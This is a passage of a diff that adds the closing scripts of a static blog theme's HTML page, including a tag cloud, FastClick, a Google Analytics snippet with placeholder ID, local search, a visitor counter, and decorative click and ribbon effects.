+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&#34;🌱&#34;,&#34;just do it&#34;,&#34;🍀&#34;]' color='[&#34;rgb(121,93,179)&#34; ,&#34;rgb(76,180,231)&#34; ,&#34;rgb(184,90,154)&#34;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+</body>
+
+</html>
